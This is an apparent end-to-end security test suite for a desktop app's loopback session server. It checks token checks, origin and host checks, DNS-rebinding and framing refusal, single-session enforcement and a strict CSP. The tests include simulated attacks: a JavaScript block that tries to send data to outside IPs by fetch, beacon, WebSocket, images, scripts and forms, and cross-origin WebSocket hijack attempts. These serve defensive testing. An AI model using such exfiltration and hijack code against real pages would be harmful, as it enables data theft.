"""Journey: nobody but the desktop window can use its session.

The desktop child serves the frontend and the app on a loopback port that
any local program, or any web page open in a local browser, can reach. Only
the window that started it may use the session: the window holds a one-time
token, its page must come from the child's own origin and host name, and
the child serves a single session. The page itself may not reach anything
off loopback. Every journey here starts the real child process through the
product's launcher, with its own sandbox home, and attacks it the way a
local program or a hostile page would.
"""

from __future__ import annotations

import asyncio
import re
from contextlib import asynccontextmanager
from pathlib import Path
from typing import AsyncIterator

import aiohttp
import pytest
from aiohttp import web

from e2e.harness import fleet
from e2e.harness.desktop import (
    CHILD_STARTUP_TIMEOUT,
    bind_loopback_listener,
    child_command,
    is_loopback_url,
    session_headers,
    upgrade_status,
    wait_until,
)
from e2e.harness.processes import require_armed

pytestmark = [pytest.mark.e2e_pr, pytest.mark.needs_browser, pytest.mark.asyncio]

FIRST_HOST = fleet.AWS_FLEET[0].name


async def _start_session(browser, child):
    """The window's side: load the page, hand over the token, see the fleet."""
    page = await browser.new_page()
    assert await page.open(child.origin) == 200
    await page.start_session(child.token.encoded_value())
    await page.wait_for_first_output()
    await page.wait_for_text(FIRST_HOST)
    return page


async def _page_is_refused(page, token: str, status: int) -> None:
    """A page that asks for the session with *token* is answered *status*."""
    await page.start_session(token)
    await page.wait_for_socket_closed()
    assert "-first-byte" not in await page.body_classes()
    assert page.text() == ""
    assert any(
        "WebSocket connection" in text and f"Unexpected response code: {status}" in text
        for _, text in page.console
    ), page.console


async def _session_still_answers(page) -> None:
    """The session keeps working: ctrl+p opens the command palette."""
    mark = page.output_mark()
    await page.press("Control+p")
    await page.wait_for_text("Search for commands", since=mark)
    assert "-closed" not in await page.body_classes()


async def test_upgrades_without_the_session_token_are_refused(desktop):
    from servonaut.desktop.host import PROTOCOL_SUBPROTOCOL
    from servonaut.desktop.model import SecretToken

    async with desktop.child() as child, desktop.browser() as browser:
        token = child.token.encoded_value()
        other_token = SecretToken.generate().encoded_value()
        attempts = {
            "no subprotocol at all": session_headers(child.port, None, protocols=[]),
            "no token": session_headers(child.port, None),
            "another session's token": session_headers(child.port, other_token),
            "the token in the wrong case": session_headers(child.port, token.swapcase()),
            "the token without the session protocol": session_headers(
                child.port, token, protocols=[f"auth.{token}"]
            ),
            "the token plus another protocol": session_headers(
                child.port, token, protocols=[PROTOCOL_SUBPROTOCOL, f"auth.{token}", "chat"]
            ),
        }
        statuses = {
            name: await upgrade_status(child.port, headers) for name, headers in attempts.items()
        }
        assert statuses == {name: 403 for name in attempts}
        # The page itself, given a wrong token, gets no session either.
        guessing = await browser.new_page()
        assert await guessing.open(child.origin) == 200
        await _page_is_refused(guessing, other_token, 403)

        # None of that used up the session: the window still gets it...
        await _start_session(browser, child)
        # ...and the app behind it started up against the local fakes.
        await wait_until(
            lambda: desktop.fake_cloud.requests("/pypi/servonaut/json"), desc="update check"
        )


async def test_upgrades_from_another_origin_or_host_name_are_refused(desktop):
    async with desktop.child() as child, desktop.browser() as browser:
        token = child.token.encoded_value()
        port = child.port
        attempts = {
            "no Origin": session_headers(port, token, origin=None),
            "another loopback port": session_headers(port, token, origin="http://127.0.0.1:1"),
            "a web site": session_headers(port, token, origin="https://example.com"),
            "an opaque origin": session_headers(port, token, origin="null"),
            "localhost instead of the address": session_headers(
                port, token, origin=f"http://localhost:{port}"
            ),
            "https on the same port": session_headers(
                port, token, origin=f"https://127.0.0.1:{port}"
            ),
            "the right Origin twice": session_headers(port, token)
            + [("Origin", f"http://127.0.0.1:{port}")],
            "a rebound host name": session_headers(port, token, host=f"localhost:{port}"),
            "another port in Host": session_headers(port, token, host="127.0.0.1:1"),
            "no Host": session_headers(port, token, host=None),
        }
        statuses = {
            name: await upgrade_status(port, headers) for name, headers in attempts.items()
        }
        # An HTTP/1.1 request without Host is malformed before it is anything else.
        assert statuses == {name: 400 if name == "no Host" else 403 for name in attempts}

        # A page reached under another host name (DNS rebinding) gets nothing.
        rebound = await browser.new_page()
        assert await rebound.open(f"http://localhost:{port}/") == 403

        # A hostile page on another local origin that knows the token still
        # cannot open the session.
        async with _hostile_site() as hostile_origin:
            hostile = await browser.new_page()
            assert await hostile.open(hostile_origin) == 200
            outcome = await hostile.page.evaluate(
                """([url, protocols]) => new Promise(resolve => {
                    const socket = new WebSocket(url, protocols);
                    socket.onopen = () => { socket.close(); resolve('opened'); };
                    socket.onclose = () => resolve('refused');
                })""",
                [f"ws://127.0.0.1:{port}/ws?width=80&height=24", _protocols(token)],
            )
            assert outcome == "refused"
            # Nor can it show the app inside a frame of its own.
            await hostile.page.evaluate(
                "src => document.body.appendChild(Object.assign("
                "document.createElement('iframe'), {src}))",
                child.origin,
            )
            await wait_until(
                lambda: any("frame-ancestors" in text for _, text in hostile.console),
                desc="the framing refusal",
            )
            embedded = [frame for frame in hostile.page.frames if frame != hostile.page.main_frame]
            assert len(embedded) == 1
            assert await embedded[0].query_selector("#terminal") is None

        # The window's own page still gets the session afterwards.
        await _start_session(browser, child)


async def test_a_second_connection_is_refused_while_a_session_runs(desktop):
    from servonaut.desktop.model import SecretToken

    async with desktop.child() as child, desktop.browser() as browser:
        token = child.token.encoded_value()
        page = await _start_session(browser, child)

        # Right token, right origin, right host: still only one session.
        assert await upgrade_status(child.port, session_headers(child.port, token)) == 409
        # A wrong token is refused as unauthenticated, not told about the session.
        other = SecretToken.generate().encoded_value()
        assert await upgrade_status(child.port, session_headers(child.port, other)) == 403

        # A second window with the right token is refused too.
        second = await browser.new_page()
        assert await second.open(child.origin) == 200
        await _page_is_refused(second, token, 409)

        await _session_still_answers(page)


async def test_the_page_never_reaches_anything_off_loopback(desktop):
    async with desktop.child() as child, desktop.browser(allow_csp_blocked=True) as browser:
        # Every response the child sends carries the policy, errors included.
        async with aiohttp.ClientSession() as http:
            for path, host, status in (
                ("/bootstrap.js", f"127.0.0.1:{child.port}", 200),
                ("/nothing-here", f"127.0.0.1:{child.port}", 404),
                ("/", f"localhost:{child.port}", 403),
            ):
                async with http.get(f"{child.origin}{path}", headers={"Host": host}) as response:
                    assert response.status == status, path
                    _assert_strict_csp(response.headers["Content-Security-Policy"], child.port)
                    assert response.headers["X-Frame-Options"] == "DENY"
                    assert response.headers["Referrer-Policy"] == "no-referrer"

        page = await _start_session(browser, child)
        _assert_strict_csp(page.document_response.headers["content-security-policy"], child.port)
        # Normal use made no request that is not to the child itself.
        assert all(is_loopback_url(url) for url, _ in browser.requests())
        assert browser.off_loopback() == []

        blocked = await page.page.evaluate(_EXFILTRATION_ATTEMPTS)
        # Every attempt was refused by the page's own policy...
        assert blocked["outcomes"] == {name: "blocked" for name in blocked["outcomes"]}
        assert all(blocked["reported"].values()), blocked["violations"]
        # ...before it left the browser: the only off-loopback requests
        # Playwright saw are the ones the page's policy stopped.
        off_loopback = [
            (url, failure) for url, failure in browser.requests() if not is_loopback_url(url)
        ]
        assert all(failure == "csp" for _, failure in off_loopback), off_loopback
        assert browser.off_loopback(allow_csp_blocked=True) == []
        # The session was not disturbed. (A refused form submission leaves
        # Playwright waiting for a navigation, so read the page directly.)
        assert page.closed_sockets == []
        assert "-closed" not in await page.page.evaluate("document.body.className")


async def test_the_session_token_is_handed_out_once(desktop, seed, journey):
    from servonaut.desktop.bridge import DesktopBridgeError
    from servonaut.desktop.launcher import DesktopLaunchRequest, DesktopSessionOwner
    from servonaut.runtime import detect_runtime

    seed.config()
    seed.cache(fleet.cache_rows(), fresh=True)
    async with desktop.browser() as browser:
        page = await browser.new_page()
        owner = DesktopSessionOwner()
        request = DesktopLaunchRequest(
            runtime=detect_runtime(),
            child_argv=child_command(),
            startup_timeout=CHILD_STARTUP_TIMEOUT,
        )
        # The window's launcher starts the child and keeps the token for the
        # page; it asks the window where the page is before handing it over.
        ready = await asyncio.to_thread(owner.start, request, get_current_url=lambda: page.page.url)
        try:
            require_armed(journey.armed_log, pid=owner.tree.pid)
            bridge = owner.bridge
            # Not while the window shows anything but the child's own page.
            with pytest.raises(DesktopBridgeError, match="unauthorized-origin"):
                bridge.claim_session()
            assert await page.open(f"{ready.origin}/licenses.json") == 200
            with pytest.raises(DesktopBridgeError, match="unauthorized-origin"):
                bridge.claim_session()

            assert await page.open(ready.origin) == 200
            token = bridge.claim_session()
            # Once only: the second ask gets nothing.
            with pytest.raises(DesktopBridgeError, match="already-claimed"):
                bridge.claim_session()
            assert bridge.claimed

            await page.start_session(token)
            await page.wait_for_first_output()
            await page.wait_for_text(FIRST_HOST)
            # The page cannot be made to use it again...
            assert await page.page.evaluate("typeof window.startServonaut") == "undefined"
            assert await page.page.evaluate(_OPEN_SECOND_SOCKET) == "refused"
            # ...and it was never written anywhere a local user could read it.
            child_pid = owner.tree.pid
            for leak in (
                Path(f"/proc/{child_pid}/cmdline").read_bytes(),
                Path(f"/proc/{child_pid}/environ").read_bytes(),
                page.page.url.encode(),
                (await page.page.content()).encode(),
            ):
                assert token.encode() not in leak
            await _session_still_answers(page)
        finally:
            await asyncio.to_thread(owner.request_shutdown)
            await asyncio.to_thread(owner.close)
        logs = [*seed.data_dir.glob("logs/*.log"), journey.directory / "servonaut.log"]
        assert len(logs) > 1, "the desktop child wrote no log"
        for log in logs:
            assert token not in log.read_text(encoding="utf-8", errors="replace"), log.name


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _protocols(token: str) -> list[str]:
    from servonaut.desktop.host import PROTOCOL_SUBPROTOCOL

    return [PROTOCOL_SUBPROTOCOL, f"auth.{token}"]


_HOSTILE_PAGE = "<!doctype html><title>elsewhere</title><p>another local page</p>"


@asynccontextmanager
async def _hostile_site() -> AsyncIterator[str]:
    """A page on another loopback port, standing in for any local web page."""

    async def page(_request: web.Request) -> web.Response:
        return web.Response(text=_HOSTILE_PAGE, content_type="text/html")

    listener = bind_loopback_listener()
    app = web.Application()
    app.router.add_get("/", page)
    runner = web.AppRunner(app, access_log=None)
    await runner.setup()
    await web.SockSite(runner, listener).start()
    try:
        yield f"http://127.0.0.1:{listener.getsockname()[1]}/"
    finally:
        await runner.cleanup()


def _assert_strict_csp(header: str, port: int) -> None:
    directives = {
        name: values
        for name, *values in (part.split() for part in header.split(";") if part.strip())
    }
    assert directives["default-src"] == ["'none'"]
    assert directives["script-src"] == ["'self'"]
    assert directives["connect-src"] == [f"ws://127.0.0.1:{port}"]
    assert directives["frame-ancestors"] == ["'none'"]
    assert directives["form-action"] == ["'none'"]
    assert directives["base-uri"] == ["'none'"]
    assert "'unsafe-inline'" not in directives["script-src"]
    for name, values in directives.items():
        for value in values:
            assert value not in ("*", "'unsafe-eval'", "blob:"), (name, value)
            assert value != "data:" or name == "img-src", (name, value)
            if re.match(r"(?i)^(https?|wss?):", value):
                assert (name, value) == ("connect-src", f"ws://127.0.0.1:{port}"), (name, value)


# Resolves to 'refused' when a page script cannot open a session socket of
# its own (no token to offer).
_OPEN_SECOND_SOCKET = """() => new Promise(resolve => {
    const url = location.origin.replace('http:', 'ws:') + '/ws?width=80&height=24';
    const socket = new WebSocket(url);
    socket.onopen = () => { socket.close(); resolve('opened'); };
    socket.onclose = () => resolve('refused');
})"""

# What a compromised page would try: send data out, pull code or style in,
# frame another site, submit a form, open a socket elsewhere. Resolves once
# every attempt has settled and reported its policy violation.
_EXFILTRATION_ATTEMPTS = """async () => {
    // Each attempt, and the policy directive that must refuse it.
    const attempts = {
        fetch: ['https://9.9.9.9/collect', 'connect-src'],
        beacon: ['https://9.9.9.9/beacon', 'connect-src'],
        websocket: ['wss://8.8.8.8/socket', 'connect-src'],
        image: ['http://1.1.1.1/pixel.png', 'img-src'],
        script: ['https://8.8.8.8/tracker.js', 'script-src-elem'],
        style: ['https://1.1.1.1/theme.css', 'style-src-elem'],
        font: ['https://8.8.8.8/font.woff2', 'font-src'],
        frame: ['https://9.9.9.9/frame', 'frame-src'],
        form: ['https://1.1.1.1/submit', 'form-action'],
    };
    const url = name => attempts[name][0];
    const violations = [];
    document.addEventListener('securitypolicyviolation', event => {
        violations.push({directive: event.effectiveDirective, blocked: event.blockedURI});
    });
    // A report names the full URL, or only its origin for navigations.
    const reported = name => violations.some(v =>
        v.directive === attempts[name][1]
        && (v.blocked === url(name) || v.blocked === new URL(url(name)).origin));
    const element = (tag, attribute, target, extra = {}) => new Promise(resolve => {
        const node = Object.assign(document.createElement(tag), extra);
        node.onload = () => resolve('loaded');
        node.onerror = () => resolve('blocked');
        node[attribute] = target;
        document.body.appendChild(node);
    });

    const outcomes = {};
    outcomes.fetch = await fetch(url('fetch'), {method: 'POST', body: 'data'})
        .then(() => 'loaded', () => 'blocked');
    navigator.sendBeacon(url('beacon'), 'data');  // queued either way; see its report
    outcomes.websocket = await new Promise(resolve => {
        try {
            const socket = new WebSocket(url('websocket'));
            socket.onopen = () => { socket.close(); resolve('loaded'); };
            socket.onerror = () => resolve('blocked');
        } catch (error) {
            resolve('blocked');
        }
    });
    outcomes.image = await element('img', 'src', url('image'));
    outcomes.script = await element('script', 'src', url('script'));
    outcomes.style = await element('link', 'href', url('style'), {rel: 'stylesheet'});
    outcomes.font = await new FontFace('probe', `url(${url('font')})`).load()
        .then(() => 'loaded', () => 'blocked');
    document.body.appendChild(Object.assign(document.createElement('iframe'), {src: url('frame')}));
    const form = Object.assign(
        document.createElement('form'), {method: 'post', action: url('form')});
    document.body.appendChild(form);
    form.submit();

    const names = Object.keys(attempts);
    for (let waited = 0; !names.every(reported) && waited < 10000; waited += 20) {
        await new Promise(resolve => setTimeout(resolve, 20));
    }
    for (const name of ['beacon', 'frame', 'form']) {
        outcomes[name] = reported(name) ? 'blocked' : 'sent';
    }
    return {
        outcomes,
        reported: Object.fromEntries(names.map(name => [name, reported(name)])),
        violations,
    };
}"""
